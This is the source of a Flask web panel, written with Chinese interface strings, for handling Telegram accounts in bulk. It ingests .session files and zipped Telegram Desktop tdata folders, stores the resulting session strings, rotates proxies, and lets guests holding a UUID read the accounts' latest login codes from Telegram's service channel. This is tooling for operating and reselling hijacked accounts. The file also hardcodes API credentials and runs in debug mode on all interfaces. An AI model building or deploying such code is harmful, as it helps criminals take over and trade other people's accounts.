import zipfile
import uuid
import sqlite3
from flask import Flask, request, render_template, redirect, url_for, session, flash, g, jsonify, Response
from werkzeug.security import generate_password_hash, check_password_hash
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, FloodWaitError
import re
import os
import asyncio
import tempfile
# from opentele.exception import OpenTeleException
# from opentele.td import TDesktop
# from opentele.api import UseCurrentSession
import logging
import threading
from datetime import datetime
from functools import wraps
import phonenumbers
from phonenumbers import geocoder
import pytz
import urllib.parse
import random

# --- Basic Setup ---
app = Flask(__name__)
app.secret_key = os.urandom(24)
logging.basicConfig(level=logging.INFO)

# --- Constants ---
SESSION_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sessions')
os.makedirs(SESSION_DIR, exist_ok=True)
API_ID = 19842526
API_HASH = '1ddb30b32ff81188a4356450ffff3035'
DATABASE = 'database.db'
SHANGHAI_TZ = pytz.timezone('Asia/Shanghai')


# --- Database Setup ---
def get_db():
    """Opens a new database connection if there is none yet for the current application context."""
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE, check_same_thread=False)
        db.row_factory = sqlite3.Row
        db.execute("PRAGMA foreign_keys = ON")
    return db


@app.teardown_appcontext
def close_connection(exception):
    """Closes the database again at the end of the request."""
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


def init_db():
    """Initializes the database using the schema.sql file."""
    with app.app_context():
        with open('schema.sql', 'r') as f:
            schema = f.read()
        db = get_db()
        db.cursor().executescript(schema)
        db.commit()


# --- Helper Functions & Decorators ---
def login_required(f):
    """Decorator to ensure a user is logged in before accessing a route."""

    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            flash('此页面需要登录才能访问', 'error')
            return redirect(url_for('login'))
        return f(*args, **kwargs)

    return decorated_function


def parse_proxy_url(proxy_url):
    """Parses a proxy URL into the format required by Telethon."""
    if not proxy_url: return None
    try:
        parsed = urllib.parse.urlparse(proxy_url)
        return (parsed.scheme, parsed.hostname, parsed.port, True, parsed.username, parsed.password)
    except Exception:
        return None


def get_user_proxy(user_id):
    """Fetches a random proxy for a given user from the database."""
    db = get_db()
    proxy_rows = db.execute('SELECT proxy_string FROM proxies WHERE user_id = ?', (user_id,)).fetchall()
    if not proxy_rows: return None
    return parse_proxy_url(random.choice(proxy_rows)['proxy_string'])


def beijing_time_filter(utc_dt_str):
    """Jinja filter to convert UTC datetime string to Beijing time."""
    try:
        # Assuming the string is in a standard format Python can parse
        utc_dt = datetime.fromisoformat(str(utc_dt_str).replace(' ', 'T'))
        return utc_dt.astimezone(SHANGHAI_TZ).strftime('%Y-%m-%d %H:%M:%S')
    except (ValueError, TypeError):
        return utc_dt_str  # Return original if format is unexpected


app.jinja_env.filters['beijing_time'] = beijing_time_filter


def run_async_in_thread(async_func):
    """Runs an async function in a new event loop in a separate thread."""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(async_func)
    finally:
        loop.close()


# --- Core Telegram Logic ---
async def fetch_telegram_data(session_string, proxy=None):
    """
    Fetches the latest login codes from Telegram's service channel.

    Args:
        session_string (str): The Telethon session string.
        proxy (dict, optional): The proxy configuration to use. Defaults to None.

    Returns:
        dict: A dictionary containing the codes, phone number, chat ID, and any errors.
    """

    client = TelegramClient(StringSession(session_string), API_ID, API_HASH, proxy=proxy)

    try:
        await client.connect()
        me = await client.get_me()
        if me is None:
            # Handle cases where the session is invalid or the account is deleted
            return {'codes': ["号死了"], 'phone': "号死了", 'chat_id': "没id", 'error': 'Invalid session or account deleted.'}
        print(f"Authenticated as phone: {me.phone}")
    except AttributeError:
        # This can happen if get_me() returns None, indicating a dead session
        return {'codes': ["号死了"], 'phone': "号死了", 'chat_id': "没id", 'error': 'AttributeError, likely a dead session.'}
    finally:
        await client.disconnect()

    async with TelegramClient(StringSession(session_string), API_ID, API_HASH, proxy=proxy) as client:
        me = await client.get_me()
        codes = []
        # 777000 is the official Telegram service notifications account
        entity = await client.get_entity(777000)

        async for message in client.iter_messages(entity, limit=20):
            message_text = message.raw_text or ""
            if "Login code" in message_text or "登录代码" in message_text:
                if code_match := re.search(r'\b\d{5}\b', message_text):
                    codes.append({
                        'code': code_match.group(0),
                        'time': message.date.astimezone(SHANGHAI_TZ).strftime('%Y-%m-%d %H:%M:%S')
                    })
                    # 2. Return a maximum of three codes
                    if len(codes) >= 3:
                        break  # Exit loop after finding 3 codes

        return {
            'codes': codes,
            'phone': f"+{me.phone}" if me and me.phone else "N/A",
            'chat_id': me.id if me else "N/A",
            'error': None
        }


async def get_session_details(client):
    """Gathers details (phone, user_id, etc.) from an authorized Telegram client."""
    me = await client.get_me()
    if not me: return None
    phone = f"+{me.phone}" if me.phone else None
    try:
        country = geocoder.country_name_for_number(phonenumbers.parse(phone), 'en') if phone else "Unknown"
    except Exception:
        country = "Unknown"
    return {
        "session_string": StringSession.save(client.session),
        "chat_id": str(me.id),
        "phone": phone,
        "country": country,
        "uuid": str(uuid.uuid4())  # Generate UUID here
    }


def store_session_in_db(details, user_id):
    """Stores the gathered session details into the database."""
    db = get_db()
    db.execute(
        'INSERT INTO sessions (user_id, uuid, name, session_string, chat_id, phone, country, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
        (user_id, details['uuid'], f"Account {details['phone']}", details['session_string'], details['chat_id'],
         details['phone'], details['country'], datetime.now(SHANGHAI_TZ))
    )
    db.commit()


# --- Background Processing ---
def background_task_wrapper(app_context, func, user_id, file_path, original_filename):
    """
    A wrapper to run file processing in the background, handling logging and cleanup.
    """
    with app_context:
        log_file_path = f"upload_log_{user_id}.txt"
        try:
            # Run the appropriate processing function (e.g., process_session_file)
            details = run_async_in_thread(func(user_id, file_path))
            if details:
                store_session_in_db(details, user_id)
                log_message = f"SUCCESS: File '{original_filename}' processed. UUID: {details['uuid']}, Phone: {details['phone']}, UserID: {details['chat_id']}"
            else:
                log_message = f"FAILURE: File '{original_filename}' -> Could not retrieve account details after processing."
        except Exception as e:
            logging.error(f"Error in background task for '{original_filename}': {e}")
            log_message = f"FAILURE: File '{original_filename}' -> Error: {e}"
        finally:
            # Log the result to the user-specific file
            timestamp = datetime.now(SHANGHAI_TZ).strftime('%Y-%m-%d %H:%M:%S')
            with open(log_file_path, 'a', encoding='utf-8') as f:
                f.write(f"[{timestamp}] {log_message}\n")
            # Clean up the temporary file
            if os.path.exists(file_path):
                os.remove(file_path)


async def process_session_file(user_id, file_path):
    """Processes a .session file."""
    proxy = get_user_proxy(user_id)
    client = TelegramClient(file_path, API_ID, API_HASH, proxy=proxy)
    await client.connect()
    if not await client.is_user_authorized():
        raise Exception("Session file is invalid or expired.")
    details = await get_session_details(client)
    await client.disconnect()
    return details


async def process_tdata_zip(user_id, zip_path):
    """Processes a tdata folder compressed as a .zip file."""
    proxy = get_user_proxy(user_id)
    temp_extract_dir = tempfile.mkdtemp()
    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall(temp_extract_dir)
        tdata_path = os.path.join(temp_extract_dir, 'tdata')
        if not os.path.isdir(tdata_path):
            raise Exception("ZIP archive must contain a 'tdata' folder at its root.")

        # Convert TDesktop to Telethon session
        tdesk = TDesktop(tdata_path)
        client = await tdesk.to_telethon(api_id=API_ID, api_hash=API_HASH, flag=UseCurrentSession, proxy=proxy)

        await client.connect()
        details = await get_session_details(client)
        await client.disconnect()
        return details
    finally:
        # Cleanup the extracted folder
        import shutil
        shutil.rmtree(temp_extract_dir)


# --- Routes ---

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('manage_sessions'))
    return redirect(url_for('get_code'))


@app.route('/get_code', methods=['GET', 'POST'])
def get_code():
    """
    A guest-accessible route to fetch login codes using a session UUID.
    This is primarily for guest users who don't want to log in.
    """
    result = None
    uuid_from_form = request.form.get('uuid', '')
    uuid_from_form = uuid_from_form.strip()
    if request.method == 'POST':
        if not uuid_from_form:
            flash('请输入有效的 UUID', 'error')
            return render_template('index.html', uuid=uuid_from_form)

        db = get_db()
        # Anyone can use any UUID, no user_id check here as it's for guests
        session_data = db.execute('SELECT * FROM sessions WHERE uuid = ?', (uuid_from_form,)).fetchone()

        if session_data:
            # Proxies are tied to users, so if the session has a user, use their proxy
            proxy = get_user_proxy(session_data['user_id']) if session_data['user_id'] else None
            try:
                result = run_async_in_thread(fetch_telegram_data(session_data['session_string'], proxy))
            except Exception as e:
                logging.error(f"Error fetching telegram data for UUID {uuid_from_form}: {e}")
                result = {'error': f'运行时错误: {e}'}
        else:
            result = {'error': '未找到具有此UUID的会话'}

    return render_template('index.html', result=result, uuid=uuid_from_form)


# --- Authentication Routes ---
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username, password = request.form['username'], request.form['password']
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        if user and check_password_hash(user['password_hash'], password):
            session.clear()
            session['user_id'] = user['id']
            session['username'] = user['username']  # Store username for display
            session.permanent = True
            flash('登录成功！', 'success')
            return redirect(url_for('manage_sessions'))
        else:
            flash('无效的用户名或密码', 'error')
    return render_template('login.html')


@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username, password = request.form['username'], request.form['password']
        db = get_db()
        if db.execute('SELECT id FROM users WHERE username = ?', (username,)).fetchone():
            flash('用户名已存在', 'error')
        else:
            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)',
                       (username, generate_password_hash(password)))
            db.commit()
            flash('注册成功，请登录', 'success')
            return redirect(url_for('login'))
    return render_template('register.html')


@app.route('/logout')
def logout():
    session.clear()
    flash('您已成功登出', 'success')
    return redirect(url_for('login'))


# --- User-only routes (login required) ---
@app.route('/manage_sessions')
@login_required
def manage_sessions():
    db = get_db()
    user_sessions = db.execute('SELECT * FROM sessions WHERE user_id = ? ORDER BY created_at DESC',
                               (session['user_id'],)).fetchall()
    return render_template('manage_sessions.html', sessions=user_sessions)


@app.route('/bulk_actions', methods=['POST'])
@login_required
def bulk_actions():
    db = get_db()
    session_ids = request.form.getlist('session_ids')
    action = request.form.get('action')
    if not session_ids:
        flash('请至少选择一个会话', 'warning')
        return redirect(url_for('manage_sessions'))
    if action == 'delete':
        placeholders = ','.join('?' for _ in session_ids)
        query = f'DELETE FROM sessions WHERE id IN ({placeholders}) AND user_id = ?'
        params = session_ids + [session['user_id']]
        db.execute(query, params)
        db.commit()
        flash(f'{len(session_ids)} 个会话已删除', 'success')
    return redirect(url_for('manage_sessions'))


# --- File Conversion Routes ---
@app.route('/session_to_string', methods=['GET', 'POST'])
@login_required
def session_to_string():
    if request.method == 'POST':
        files = request.files.getlist('files')
        if not any(f.filename for f in files):
            flash('请选择文件', 'error')
            return redirect(request.url)
        for f in files:
            if f.filename:
                # Save file temporarily with a unique name
                temp_f_path = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}.session")
                f.save(temp_f_path)
                # Start background processing
                threading.Thread(target=background_task_wrapper, args=(
                    app.app_context(), process_session_file, session['user_id'], temp_f_path, f.filename)).start()
        flash('文件上传成功，正在后台处理中...请稍后在“上传日志”页面查看结果。', 'info')
        return redirect(url_for('manage_sessions'))
    return render_template('convert_form.html', title='转换 .session 文件', form_url=url_for('session_to_string'),
                           accept_type='.session', file_label='选择 .session 文件')


@app.route('/upload_tdata', methods=['GET', 'POST'])
@login_required
def upload_tdata():
    if request.method == 'POST':
        files = request.files.getlist('files')
        if not any(f.filename for f in files):
            flash('请选择文件', 'error')
            return redirect(request.url)
        for f in files:
            if f.filename:
                temp_f_path = os.path.join(tempfile.gettempdir(), f"{uuid.uuid4()}.zip")
                f.save(temp_f_path)
                threading.Thread(target=background_task_wrapper,
                                 args=(app.app_context(), process_tdata_zip, session['user_id'], temp_f_path,
                                       f.filename)).start()
        flash('文件上传成功，正在后台处理中...请稍后在“上传日志”页面查看结果。', 'info')
        return redirect(url_for('manage_sessions'))
    return render_template('convert_form.html', title='转换 TData 文件夹', form_url=url_for('upload_tdata'),
                           accept_type='.zip', file_label='选择 tdata 文件夹的 .zip 压缩包')


# --- Proxy Management Routes ---
@app.route('/manage_proxy', methods=['GET'])
@login_required
def manage_proxy():
    db = get_db()
    proxies = db.execute('SELECT id, proxy_string FROM proxies WHERE user_id = ? ORDER BY id DESC',
                         (session['user_id'],)).fetchall()
    return render_template('manage_proxy.html', proxies=proxies)


@app.route('/add_proxy', methods=['POST'])
@login_required
def add_proxy():
    proxy_string = request.form.get('proxy', '').strip()
    if proxy_string:
        db = get_db()
        db.execute('INSERT INTO proxies (user_id, proxy_string) VALUES (?, ?)', (session['user_id'], proxy_string))
        db.commit()
        flash('代理已成功添加', 'success')
    else:
        flash('代理地址不能为空', 'error')
    return redirect(url_for('manage_proxy'))


@app.route('/delete_proxy/<int:proxy_id>', methods=['POST'])
@login_required
def delete_proxy(proxy_id):
    db = get_db()
    proxy = db.execute('SELECT id FROM proxies WHERE id = ? AND user_id = ?', (proxy_id, session['user_id'])).fetchone()
    if proxy:
        db.execute('DELETE FROM proxies WHERE id = ?', (proxy_id,))
        db.commit()
        flash('代理已删除', 'success')
    else:
        flash('未找到代理或无权操作', 'error')
    return redirect(url_for('manage_proxy'))


# --- TXT Download and Log Viewing ---
@app.route('/download_txt')
@login_required
def download_txt():
    """Generates and serves a TXT file of successful session uploads."""
    db = get_db()
    user_sessions = db.execute(
        'SELECT uuid, phone, chat_id FROM sessions WHERE user_id = ? AND phone IS NOT NULL ORDER BY created_at DESC',
        (session['user_id'],)).fetchall()

    def generate():
        yield "uuid,phone_number,user_id\n"
        for s in user_sessions:
            yield f"{s['uuid']},{s['phone']},{s['chat_id']}\n"

    return Response(
        generate(),
        mimetype="text/plain",
        headers={"Content-disposition":
                     "attachment; filename=successful_uploads.txt"})


@app.route('/upload_log')
@login_required
def upload_log():
    """Displays the content of the user-specific upload log file."""
    log_content = ""
    log_file_path = f"upload_log_{session['user_id']}.txt"
    try:
        if os.path.exists(log_file_path):
            with open(log_file_path, 'r', encoding='utf-8') as f:
                log_lines = f.readlines()
                log_lines.reverse()  # Show newest first
                log_content = "".join(log_lines)
        else:
            log_content = "还没有任何上传记录。"
    except Exception as e:
        log_content = f"读取日志文件时出错: {e}"
        logging.error(f"Error reading log file for user {session['user_id']}: {e}")

    return render_template('upload_log.html', log_content=log_content)


# --- Telegram Direct Login ---

@app.route('/telegram_login', methods=['GET', 'POST'])
@login_required
def telegram_login():  # Changed back to a regular 'def'
    """
    Handles the multi-step process of logging into Telegram directly.
    This is a synchronous view function that runs async code internally.
    """
    if request.method == 'GET':
        step = session.get('telegram_login_step', 'phone')
        return render_template('telegram_login.html', step=step)

    # --- For POST requests, run the async logic ---
    redirect_url = asyncio.run(do_telegram_login_step())
    return redirect(redirect_url)


async def do_telegram_login_step():
    """
    Encapsulates the asynchronous logic for the login steps.
    This function is run by asyncio.run() from the main view.
    It returns the URL to redirect to.
    """
    user_id = session['user_id']
    proxy = get_user_proxy(user_id)
    session_string = session.get('login_session_string')
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH, proxy=proxy)

    try:
        await client.connect()
        step = session.get('telegram_login_step', 'phone')

        if step == 'phone':
            phone = request.form['phone']
            try:
                result = await client.send_code_request(phone)
                session['phone_number'] = phone
                session['phone_code_hash'] = result.phone_code_hash
                session['telegram_login_step'] = 'code'
                flash('验证码已发送到您的 Telegram', 'info')
            except FloodWaitError as e:
                flash(f'操作过于频繁，请等待 {e.seconds} 秒后再试', 'error')
            except Exception as e:
                flash(f'发送验证码时出错: {e}', 'error')
                session['telegram_login_step'] = 'phone'

        elif step == 'code':
            code = request.form['code']
            phone = session.get('phone_number')
            phone_code_hash = session.get('phone_code_hash')
            try:
                await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                details = await get_session_details(client)
                store_session_in_db(details, user_id)
                flash('Telegram 登录成功！', 'success')
                for key in ['telegram_login_step', 'phone_number', 'phone_code_hash', 'login_session_string']:
                    session.pop(key, None)
                return url_for('manage_sessions')
            except SessionPasswordNeededError:
                session['telegram_login_step'] = 'password'
                flash('您的账号已启用两步验证，请输入密码', 'info')
            except PhoneCodeInvalidError:
                flash('无效的验证码，请重试', 'error')
            except Exception as e:
                flash(f'登录时出错: {e}', 'error')
                session['telegram_login_step'] = 'phone'

        elif step == 'password':
            password = request.form['password']
            try:
                await client.sign_in(password=password)
                details = await get_session_details(client)
                store_session_in_db(details, user_id)
                flash('Telegram 登录成功！', 'success')
                for key in ['telegram_login_step', 'phone_number', 'phone_code_hash', 'login_session_string']:
                    session.pop(key, None)
                return url_for('manage_sessions')
            except PasswordHashInvalidError:
                flash('密码错误，请重试', 'error')
            except Exception as e:
                flash(f'登录时出错: {e}', 'error')
                session['telegram_login_step'] = 'phone'

    finally:
        if client.session.save():
            session['login_session_string'] = client.session.save()
        if client.is_connected():
            await client.disconnect()

    # Default redirect target if not successful
    return url_for('telegram_login')


@app.route('/cancel_telegram_login', methods=['POST'])
@login_required
def cancel_telegram_login():
    """Clears all session variables related to the Telegram login flow."""
    for key in ['telegram_login_step', 'phone_number', 'phone_code_hash', 'login_session_string']:
        session.pop(key, None)
    flash('登录流程已取消', 'info')
    return redirect(url_for('telegram_login'))


if __name__ == '__main__':
    with app.app_context():
        init_db()  # Ensure the database is created on startup
    app.run(debug=True, host='0.0.0.0', port=5555)
